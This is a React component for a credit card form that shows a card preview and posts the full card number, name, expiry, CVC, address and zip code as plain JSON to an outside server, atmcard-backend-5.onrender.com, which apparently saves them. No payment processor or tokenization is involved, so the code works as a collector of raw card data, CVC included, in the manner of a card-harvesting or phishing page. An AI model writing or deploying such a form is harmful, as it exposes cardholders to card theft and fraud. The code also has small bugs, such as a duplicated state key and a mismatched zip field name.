"use client";
import React, { useState } from "react";
import "react-credit-cards-2/dist/es/styles-compiled.css";
import Cards from "react-credit-cards-2";
import "bootstrap/dist/css/bootstrap.min.css";
import toast, { Toaster } from "react-hot-toast";

const CreditCardForm = () => {
  const [state, setState] = useState({
    number: "",
    name: "",
    expiry: "",
    cvc: "",
    name: "",
    address: "",
    zip: "",
  });

  const [error, setError] = useState("");

  const validateZipCode = (zip) => {
    // Regular expression for US zip code (5 digits)
    const zipRegex = /^\d{5}$/;
    if (zipRegex.test(zip)) {
      setError("");
    } else {
      setError("Invalid zip code format");
    }
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setState((prev) => ({ ...prev, [name]: value }));
  };
  const handleInputFocus = (e) => {
    setState((prev) => ({ ...prev, focus: e.target.name }));
  };

  const handledate = (e) => {
    const input = e.target.value.replace(/\D/g, ""); // Remove non-digit characters
    const formattedInput = input.replace(/(\d{2})(\d{2})/, "$1/$2"); // Insert '/' after every 2 digits
    // setInputValue(formattedInput);
    setState({ ...state, expiry: formattedInput });
  };

  const handleAdress = (e) => {
    setState({
      ...state,
      address: e.target.value,
    });
  };

  const handleZipCode = (e) => {
    setState({
      ...state,
      zip: e.target.value,
    });

    validateZipCode(e.target.value);
  };
  //https://atmcard-backend-5.onrender.com/create
  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch("https://atmcard-backend-5.onrender.com/create", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(state),
      });
  
      // Check if response is OK
      if (response.ok) {
        // Display loading message for 2 seconds
        toast.promise(
          new Promise((resolve) => {
            setTimeout(() => resolve(response), 2000); // 2-second delay
          }),
          {
            loading: 'Loading',
            success: (data) => {
              // Clear all input fields
              setState({
                number: "",
                name: "",
                expiry: "",
                cvc: "",
                address: "",
                zip: ""
              });
              return `Successfully`;
              
            },
            error: (err) => `This just happened: ${err.toString()}`,
          },
          {
            style: {
              minWidth: '250px',
            },
            success: {
              duration: 5000,
              icon: '🔥',
            },
          }
        );
      } else {
        // Display error message if response is not OK
        throw new Error(`Failed to save: ${response.statusText}`);
      }
    } catch (error) {
      console.error("Error adding item:", error);
    }
  };
  
  

  return (
    <div className="information ">
      <div className="mt-3 w-25 mx-auto cardShadwo ">
        <Cards
          number={state.number}
          expiry={state.expiry}
          cvc={state.cvc}
          name={state.name}
          focused={state.focus}
        />

        <form onSubmit={handleSubmit} className="mt-4">
          <div className="mb-3">
            <input
              name="number"
              type="tel"
              inputmode="numeric"
              pattern="[0-9]*"
              autocomplete="cc-number"
              maxlength="19"
              className="form-control shadow-sm"
              placeholder="Card Number"
              value={state.number}
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              onInput={(event) => {
                event.target.value = event.target.value.replace(/\D/g, "");
              }}
              required
            />
          </div>

          <div className="mb-3">
            <input
              type="text"
              name="name"
              value={state.name}
              className="form-control"
              placeholder="Name on card"
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              required
            />
          </div>
          <div className="row">
            <div className="col-6 mb-3">
              <input
                type="text"
                name="expiry"
                className="form-control shadow-sm"
                placeholder="MM/YY"
                // pattern="\d\d/\d\d"
                value={state.expiry}
                maxLength={5}
                onChange={handledate}
                onFocus={handleInputFocus}
                required
              />
            </div>
            <div className="col-6 mb-3">
              <input
                name="cvc"
                type="tel"
                inputmode="numeric"
                pattern="[0-9]*"
                maxlength="3"
                value={state.cvc}
                className="form-control shadow-sm"
                placeholder="CVC"
                onInput={(event) => {
                  event.target.value = event.target.value.replace(/\D/g, "");
                }}
                // value={state.cvc}
                onChange={handleInputChange}
                onFocus={handleInputFocus}
                required
              />
            </div>
            <div className="mb-3">
              <input
                type="text"
                name="address"
                value={state.address}
                className="form-control shadow-sm"
                placeholder="Address"
                onChange={handleAdress}
                required
              />
            </div>
            <div className={`${error !== "" ? "mb-1" : "mb-3"}`}>
              <input
                name="zipcode"
                type="tel"
                value={state.zip}
                inputmode="numeric"
                pattern="[0-9]*"
                maxlength="5"
                className="form-control shadow-sm"
                placeholder="Zip code"
                onInput={(event) => {
                  event.target.value = event.target.value.replace(/\D/g, "");
                }}
                onChange={handleZipCode}
                required
              />
            </div>
            <small
              className={`text-danger ${error !== "" ? "d-block" : "d-none"}`}
            >
              {error}
            </small>
          </div>

          <div className={`d-grid ${error !== "" ? "mt-1" : "mt-0"}`}>
            <input type="submit" value={"submit"} className="btn btn-primary" />
          </div>
        </form>
        <Toaster />
      </div>
    </div>
  );
};

export default CreditCardForm;
